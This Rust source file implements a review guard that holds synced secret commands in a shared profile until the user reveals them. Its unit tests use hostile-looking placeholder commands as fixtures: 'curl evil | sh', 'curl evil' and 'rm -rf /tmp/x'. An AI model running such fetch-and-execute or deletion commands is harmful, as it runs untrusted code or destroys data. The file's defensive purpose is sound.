//! Secret Library command review guard (#286).
//!
//! When a shared profile syncs a Secret Library command modified by someone else,
//! running it without revealing it first could execute an uninspected change.
//! This module computes whether each command's last change came from someone
//! other than this user so the confirmation dialog keeps **Run** disabled until
//! **Show command** is clicked and displays who changed it and when.

use rusqlite::Connection;
use serde_json::{json, Value};

/// Extract the HLC node id segment from `"{phys}:{counter}:{node}"`.
fn hlc_node_of(stamp: Option<&str>) -> Option<&str> {
    let s = stamp?.trim();
    let mut parts = s.splitn(3, ':');
    let _phys = parts.next()?;
    let _ctr = parts.next()?;
    let node = parts.next()?.trim();
    (!node.is_empty()).then_some(node)
}

/// True when a secret command's last modification came from someone other than
/// the local user:
/// - If `edited_by` is present and `my_label` is known, mismatch means other.
/// - If `my_label` is missing and `edited_by` is present, only treat remote-node
///   writes in a shared profile as other (avoids flagging local signed-out edits).
/// - If `edited_by` is missing/empty in a shared profile, treat a remote-node
///   `updated_at` as a sync change from another member ("someone else").
fn is_changed_by_other(
    is_shared: bool,
    my_label: Option<&str>,
    my_node: Option<&str>,
    is_secret: bool,
    edited_by: Option<&str>,
    updated_at: Option<&str>,
) -> bool {
    if !is_secret {
        return false;
    }
    let from_remote_node = matches!((hlc_node_of(updated_at), my_node), (Some(rn), Some(mn)) if !mn.is_empty() && rn != mn);
    match edited_by.map(str::trim).filter(|s| !s.is_empty()) {
        Some(who) => match my_label.map(str::trim).filter(|s| !s.is_empty()) {
            Some(me) => !who.eq_ignore_ascii_case(me),
            None => is_shared && from_remote_node,
        },
        None => is_shared && from_remote_node,
    }
}

const MERGING: &str = "COALESCE((SELECT val FROM sync_flags WHERE key='merge'),0)=1";
const NOT_MERGING: &str = "COALESCE((SELECT val FROM sync_flags WHERE key='merge'),0)=0";

/// Device-local tracking table and triggers for secret commands whose text
/// arrived by sync (#304). Not in `ENTITIES`, so it never syncs across devices.
pub(crate) fn create_schema(conn: &Connection) -> Result<(), String> {
    conn.execute_batch(&format!(
        "CREATE TABLE IF NOT EXISTS sync_flags (key TEXT PRIMARY KEY, val INTEGER NOT NULL);
         CREATE TABLE IF NOT EXISTS secret_cmd_pending_review (
             command_id INTEGER PRIMARY KEY,
             content    TEXT NOT NULL
         );
         CREATE TRIGGER IF NOT EXISTS secret_cmd_review_ai
         AFTER INSERT ON commands
         WHEN {MERGING} AND COALESCE(NEW.is_secret,0)!=0 AND COALESCE(NEW.deleted,0)=0
         BEGIN
             INSERT OR REPLACE INTO secret_cmd_pending_review(command_id, content)
             VALUES (NEW.id, COALESCE(NEW.content, ''));
         END;
         CREATE TRIGGER IF NOT EXISTS secret_cmd_review_au_sync
         AFTER UPDATE ON commands
         WHEN {MERGING} AND COALESCE(NEW.is_secret,0)!=0 AND COALESCE(NEW.deleted,0)=0
              AND (NEW.content IS NOT OLD.content OR COALESCE(OLD.is_secret,0)=0 OR COALESCE(OLD.deleted,0)!=0)
         BEGIN
             INSERT OR REPLACE INTO secret_cmd_pending_review(command_id, content)
             VALUES (NEW.id, COALESCE(NEW.content, ''));
         END;
         CREATE TRIGGER IF NOT EXISTS secret_cmd_review_au_drop
         AFTER UPDATE ON commands
         WHEN COALESCE(NEW.is_secret,0)=0 OR COALESCE(NEW.deleted,0)!=0
         BEGIN
             DELETE FROM secret_cmd_pending_review WHERE command_id = NEW.id;
         END;
         CREATE TRIGGER IF NOT EXISTS secret_cmd_review_au_local
         AFTER UPDATE ON commands
         WHEN {NOT_MERGING} AND NEW.content IS NOT OLD.content
         BEGIN
             DELETE FROM secret_cmd_pending_review WHERE command_id = NEW.id;
         END;
         CREATE TRIGGER IF NOT EXISTS secret_cmd_review_ad
         AFTER DELETE ON commands
         BEGIN
             DELETE FROM secret_cmd_pending_review WHERE command_id = OLD.id;
         END;"
    ))
    .map_err(|e| format!("[DATABASE] SECRET_REVIEW_SCHEMA_FAILED: {}", e))
}

/// Clear the device-local pending sync review record for `command_id` after the
/// user revealed and ran it, only if the text that ran still matches the saved text.
pub(crate) fn mark_reviewed(conn: &Connection, command_id: i64, ran_content: &str) -> Result<bool, String> {
    let saved: Option<(String, String)> = conn
        .query_row(
            "SELECT COALESCE(c.content, ''), r.content
             FROM secret_cmd_pending_review r
             JOIN commands c ON c.id = r.command_id
             WHERE r.command_id = ?1 AND COALESCE(c.deleted, 0) = 0",
            [command_id],
            |row| Ok((row.get(0)?, row.get(1)?)),
        )
        .ok();
    let Some((current, pending)) = saved else {
        return Ok(false);
    };
    let ran = ran_content.trim_end_matches('\n');
    if current.trim_end_matches('\n') != ran || pending.trim_end_matches('\n') != ran {
        return Ok(false);
    }
    let removed = conn
        .execute("DELETE FROM secret_cmd_pending_review WHERE command_id = ?1", [command_id])
        .map_err(|e| format!("[DATABASE] SECRET_REVIEW_CLEAR_FAILED: {}", e))?;
    Ok(removed > 0)
}

/// Load Library commands from `conn`, enriching each entry with provenance
/// (`edited_by`, `updated_at`) and `changed_by_other` for secret commands.
pub(crate) fn list_commands(conn: &Connection, my_node: Option<&str>) -> Result<Vec<Value>, String> {
    let is_shared = crate::approvals::profile_is_shared(conn);
    let my_label: Option<String> = conn
        .query_row("SELECT value FROM sync_meta WHERE key='editor_label'", [], |r| r.get(0))
        .ok();

    let has_pending_table: bool = conn
        .query_row(
            "SELECT 1 FROM sqlite_master WHERE type='table' AND name='secret_cmd_pending_review'",
            [],
            |_| Ok(true),
        )
        .unwrap_or(false);
    let sql = if has_pending_table {
        "SELECT c.id, c.title, c.content, c.scope, c.is_secret, c.tags, c.updated_at, c.edited_by, \
         r.command_id IS NOT NULL FROM commands c LEFT JOIN secret_cmd_pending_review r ON r.command_id = c.id"
    } else {
        "SELECT id, title, content, scope, is_secret, tags, updated_at, edited_by, 0 FROM commands"
    };

    let mut stmt = conn
        .prepare(sql)
        .map_err(|e| e.to_string())?;

    let rows = stmt
        .query_map([], |row| {
            let id = row.get::<_, i32>(0)?;
            let title = row.get::<_, String>(1)?;
            let content = row.get::<_, String>(2)?;
            // As a synced peer sent it: the frontend reads it defensively
            // (util/commandScope), so a broken one counts as all servers.
            let scope = row.get::<_, Option<String>>(3)?;
            // A NULL or out-of-range value from a peer must not fail
            // the whole list (same shape as run_on_connect_every).
            let is_secret = row.get::<_, Option<i64>>(4)?.unwrap_or(0) != 0;
            let tags = row.get::<_, Option<String>>(5)?;
            let updated_at = row.get::<_, Option<String>>(6)?;
            let edited_by = row.get::<_, Option<String>>(7)?;
            let pending_review = row.get::<_, i64>(8)? != 0;
            let trimmed_editor = edited_by
                .as_deref()
                .map(str::trim)
                .filter(|s| !s.is_empty())
                .map(str::to_string);
            let pending_sync_review = is_shared && is_secret && pending_review;
            let changed_by_other = pending_sync_review
                || is_changed_by_other(
                    is_shared,
                    my_label.as_deref(),
                    my_node,
                    is_secret,
                    trimmed_editor.as_deref(),
                    updated_at.as_deref(),
                );
            Ok(json!({
                "id": id,
                "title": title,
                "content": content,
                "scope": scope,
                "is_secret": is_secret,
                "tags": tags,
                "updated_at": updated_at,
                "edited_by": trimmed_editor,
                "changed_by_other": changed_by_other,
            }))
        })
        .map_err(|e| e.to_string())?;

    let mut list = Vec::new();
    for r in rows {
        list.push(r.map_err(|e| format!("[DATABASE] ROW_FETCH_FAILED: {}", e))?);
    }
    Ok(list)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::fork_hooks::app_table;

    fn test_db(shared: bool, editor_label: Option<&str>) -> Connection {
        let conn = Connection::open_in_memory().unwrap();
        conn.execute_batch(&app_table("commands")).unwrap();
        conn.execute("CREATE TABLE sync_meta (key TEXT PRIMARY KEY, value TEXT NOT NULL)", []).unwrap();
        create_schema(&conn).unwrap();
        if shared {
            conn.execute("INSERT INTO sync_meta(key, value) VALUES('share_id', 'share-1')", []).unwrap();
        }
        if let Some(lbl) = editor_label {
            conn.execute("INSERT INTO sync_meta(key, value) VALUES('editor_label', ?1)", [lbl]).unwrap();
        }
        conn
    }

    fn set_merging(conn: &Connection, on: bool) {
        let val = i32::from(on);
        conn.execute(
            "INSERT INTO sync_flags(key, val) VALUES('merge', ?1) ON CONFLICT(key) DO UPDATE SET val=?1",
            [val],
        )
        .unwrap();
    }

    #[test]
    fn own_secret_across_devices_does_not_require_reveal() {
        let conn = test_db(true, Some("bob@example.com"));
        conn.execute(
            "INSERT INTO commands(title, content, is_secret, updated_at, edited_by) VALUES('t', 'secret-cmd', 1, '0001700000000000:00001:otherdevice', 'Bob@Example.com')",
            [],
        )
        .unwrap();
        let rows = list_commands(&conn, Some("mydevice")).unwrap();
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0]["changed_by_other"], false);
    }

    #[test]
    fn synced_secret_claiming_your_name_and_device_still_waits_in_shared_profile() {
        let conn = test_db(true, Some("bob@example.com"));
        set_merging(&conn, true);
        conn.execute(
            "INSERT INTO commands(title, content, is_secret, updated_at, edited_by) VALUES('spoof', 'curl evil | sh', 1, '0001700000000000:00001:mydevice', 'Bob@Example.com')",
            [],
        )
        .unwrap();
        set_merging(&conn, false);

        let rows = list_commands(&conn, Some("mydevice")).unwrap();
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0]["changed_by_other"], true);
        // The claimed name is still shown as what the other computer sent.
        assert_eq!(rows[0]["edited_by"], "Bob@Example.com");

        // Outside a shared profile, only your own devices sync so the local queue adds no extra hold.
        conn.execute("DELETE FROM sync_meta WHERE key='share_id'", []).unwrap();
        let personal = list_commands(&conn, Some("mydevice")).unwrap();
        assert_eq!(personal[0]["changed_by_other"], false);
    }

    #[test]
    fn saving_synced_secret_locally_clears_pending_review() {
        let conn = test_db(true, Some("bob@example.com"));
        set_merging(&conn, true);
        conn.execute(
            "INSERT INTO commands(title, content, is_secret, updated_at, edited_by) VALUES('s', 'echo from-peer', 1, '0001700000000000:00001:mydevice', 'bob@example.com')",
            [],
        )
        .unwrap();
        set_merging(&conn, false);
        assert_eq!(list_commands(&conn, Some("mydevice")).unwrap()[0]["changed_by_other"], true);

        conn.execute("UPDATE commands SET content = 'echo reviewed-here' WHERE id = 1", [])
            .unwrap();
        assert_eq!(list_commands(&conn, Some("mydevice")).unwrap()[0]["changed_by_other"], false);
    }

    #[test]
    fn running_after_show_clears_only_when_ran_text_matches_saved() {
        let conn = test_db(true, Some("bob@example.com"));
        set_merging(&conn, true);
        conn.execute(
            "INSERT INTO commands(title, content, is_secret, updated_at, edited_by) VALUES('s', 'echo one\n', 1, '0001700000000000:00001:mydevice', 'bob@example.com')",
            [],
        )
        .unwrap();
        set_merging(&conn, false);

        // Stale or mismatched text must not clear what is saved.
        assert!(!mark_reviewed(&conn, 1, "echo stale").unwrap());
        assert_eq!(list_commands(&conn, Some("mydevice")).unwrap()[0]["changed_by_other"], true);

        // Running the exact saved command (after pasteText strips trailing newlines) clears it.
        assert!(mark_reviewed(&conn, 1, "echo one").unwrap());
        assert_eq!(list_commands(&conn, Some("mydevice")).unwrap()[0]["changed_by_other"], false);

        // Second sync changing content puts it back on the local queue; running the old text can't clear the new one.
        set_merging(&conn, true);
        conn.execute("UPDATE commands SET content = 'echo two' WHERE id = 1", [])
            .unwrap();
        set_merging(&conn, false);
        assert!(!mark_reviewed(&conn, 1, "echo one").unwrap());
        assert_eq!(list_commands(&conn, Some("mydevice")).unwrap()[0]["changed_by_other"], true);
    }

    #[test]
    fn synced_rename_or_new_tags_do_not_trigger_review() {
        let conn = test_db(true, Some("bob@example.com"));
        // Pre-existing local secret command (not pending).
        conn.execute(
            "INSERT INTO commands(title, content, is_secret, tags, updated_at, edited_by) VALUES('orig', 'uptime', 1, '[]', '0001700000000000:00001:mydevice', 'bob@example.com')",
            [],
        )
        .unwrap();
        assert_eq!(list_commands(&conn, Some("mydevice")).unwrap()[0]["changed_by_other"], false);

        // Sync updates only title, tags, and scope (content unchanged).
        set_merging(&conn, true);
        conn.execute(
            "UPDATE commands SET title='renamed', tags='[\"prod\"]', scope='[\"srv-1\"]' WHERE id = 1",
            [],
        )
        .unwrap();
        set_merging(&conn, false);
        assert_eq!(list_commands(&conn, Some("mydevice")).unwrap()[0]["changed_by_other"], false);

        // Sync changes text -> waits.
        set_merging(&conn, true);
        conn.execute("UPDATE commands SET content='curl evil' WHERE id = 1", [])
            .unwrap();
        set_merging(&conn, false);
        assert_eq!(list_commands(&conn, Some("mydevice")).unwrap()[0]["changed_by_other"], true);
    }

    #[test]
    fn teammate_edited_secret_requires_reveal_even_after_unshare() {
        for shared in [true, false] {
            let conn = test_db(shared, Some("bob@example.com"));
            conn.execute(
                "INSERT INTO commands(title, content, is_secret, updated_at, edited_by) VALUES('t', 'rm -rf /tmp/x', 1, '0001700000000000:00001:alicedev', 'alice@example.com')",
                [],
            )
            .unwrap();
            let rows = list_commands(&conn, Some("bobdev")).unwrap();
            assert_eq!(rows[0]["changed_by_other"], true, "shared={shared}");
            assert_eq!(rows[0]["edited_by"], "alice@example.com");
        }
    }

    #[test]
    fn unattributed_remote_sync_edit_in_shared_profile_requires_reveal() {
        let conn = test_db(true, None);
        conn.execute(
            "INSERT INTO commands(title, content, is_secret, updated_at, edited_by) VALUES('t', 'curl evil', 1, '0001700000000000:00002:peernode', NULL)",
            [],
        )
        .unwrap();
        let rows = list_commands(&conn, Some("localnode")).unwrap();
        assert_eq!(rows[0]["changed_by_other"], true);
        assert!(rows[0]["edited_by"].is_null());

        // Same-node local edit with no editor_label is treated as own.
        conn.execute("UPDATE commands SET updated_at='0001700000000001:00001:localnode'", []).unwrap();
        let rows_local = list_commands(&conn, Some("localnode")).unwrap();
        assert_eq!(rows_local[0]["changed_by_other"], false);
    }

    #[test]
    fn personal_unattributed_and_non_secret_commands_do_not_trigger() {
        let conn = test_db(false, None);
        conn.execute(
            "INSERT INTO commands(title, content, is_secret, updated_at, edited_by) VALUES('p', 'echo hi', 1, '0001700000000000:00001:other', NULL)",
            [],
        )
        .unwrap();
        conn.execute(
            "INSERT INTO commands(title, content, is_secret, updated_at, edited_by) VALUES('pub', 'uptime', 0, '0001700000000000:00001:other', 'alice@example.com')",
            [],
        )
        .unwrap();
        let rows = list_commands(&conn, Some("local")).unwrap();
        assert_eq!(rows[0]["changed_by_other"], false);
        assert_eq!(rows[1]["changed_by_other"], false);
    }
}

#[cfg(test)]
mod hook_tests {
    use crate::fork_hooks::assert_hooks;

    #[test]
    fn the_hooks_are_in_place() {
        assert_hooks(
            "lib.rs",
            include_str!("lib.rs"),
            &[
                ("", "mod secret_cmd_review;", 1),
                ("setup_master_db_with", "secret_cmd_review::create_schema(&conn)?;", 1),
                ("get_commands", "secret_cmd_review::list_commands(conn, my_node.as_deref())", 1),
                ("secret_cmd_reviewed", "secret_cmd_review::mark_reviewed(conn, id, &ran_text)", 1),
                ("", "secret_cmd_reviewed,", 1),
            ],
        );
        assert_hooks(
            "hlc.rs",
            include_str!("hlc.rs"),
            &[("node_id", "&self.node_id", 1)],
        );
    }
}
